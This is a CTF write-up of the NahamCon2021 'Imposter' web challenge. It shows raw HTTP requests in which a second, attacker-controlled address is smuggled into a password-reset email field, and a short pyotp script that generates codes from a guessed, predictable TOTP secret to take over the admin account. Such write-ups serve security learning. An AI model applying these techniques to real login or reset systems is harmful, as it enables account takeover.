---
title: "NahamCon2021 CTF - Imposter"
date: 2021-03-15T10:16:35+02:00
categories:
- writeup
- ctf
- nahamcon
- nahamcon2021
- 2021
---

## category

web - medium

## solution

This was a tricker, but fun one. The challenge URL drops us on a login page with an OTP field.

{{< figure src="/images/nahamcon/imposter.png" >}}

Signing up for an account responsed with a JSON structure containing a `url` key with an `otpauth` URI.

Request

```text
POST /signup HTTP/1.1
Host: challenge.nahamcon.com:30809
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://challenge.nahamcon.com:30809/signup
Content-Type: application/json
Origin: http://challenge.nahamcon.com:30809
Content-Length: 80
Connection: close
Cookie: auth2=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E; auth=eyJpZCI6MX0.YEp7Wg.fHdsxIGEolHgYQD0d_cvExass8E

{"username":"test","email":"test@test.com","password":"test","password2":"test"}
```

Response

```text
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 95

{"url":"otpauth://totp/2Password:test?secret=ORSXG5BRGIZTINJWG44DS%3D%3D%3D&issuer=2Password"}
```

The browser displayed a QR code that you could scan using any OTP application. Once logged in, the site had some secrets management features. I messed around with it for quite a while with no real pwnage.

The forgot password reset first had you enter a username before redirecting to a page with locked fields containing an accounts email address. I found the `admin` user this way.

{{< figure src="/images/nahamcon/imposter-admin.png" >}}

Intercepting the request when hitting the Confirm button, we could change the email address to something else. However, when you did that we got an error.

```html
<div class="alert alert-danger mt-3">
    The provided email does not contail the user&#39;s email
</div>
```

So the original email had to be in the field. Eventually I found that if I put my temp email (created using <https://mail.tm/en/>) and then the real one, separated with a `;`, I got the reset email.

```text
POST /reset_password HTTP/1.1
Host: challenge.nahamcon.com:30809
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://challenge.nahamcon.com:30809/reset_password?username=admin
Content-Type: application/json
Origin: http://challenge.nahamcon.com:30809
Content-Length: 80
Connection: close

{"username":"admin","email":"tempemail@mail.tm; admin@congon4tor.me"}
```

Response:

```text
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 17

{"success":true}
```

Clicking the link let you reset the password for the account. To login though, you needed to provide an OTP and we obviously don’t have one. A closer look at the signing up process and that `otpauth` URI, I learnt that the secret was a [base32 encoded value](https://github.com/google/google-authenticator/wiki/Key-Uri-Format). Decoding the secret in the one we had for our signup process, we find:

- Original URI: `otpauth://totp/2Password:test?secret=ORSXG5BRGIZTINJWG44DS%3D%3D%3D&issuer=2Password`
- Secret: `ORSXG5BRGIZTINJWG44DS%3D%3D%3D`
- Decoded: `test123456789`
- [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base32('A-Z2-7%3D',true)&input=T1JTWEc1QlJHSVpUSU5KV0c0NERTJTNEJTNEJTNE)

If the secret for our OTP contained our username, maybe admins is `admin123456789` (or `MFSG22LOGEZDGNBVGY3TQOI=` base32 encoded). To test this, I used [pyotp](https://pypi.org/project/pyotp/)'s `TOTP()` method to generate OTP's. 

```python
import pyotp

totp = pyotp.TOTP('MFSG22LOGEZDGNBVGY3TQOI=')
print(totp.now()) # => '492039'
```

Using the password I set for the admin account and the OTP's I was generating, I could login as `admin`!

Last step was to reveal the flag with another OTP.

{{< figure src="/images/nahamcon/imposter-solve.png" >}}
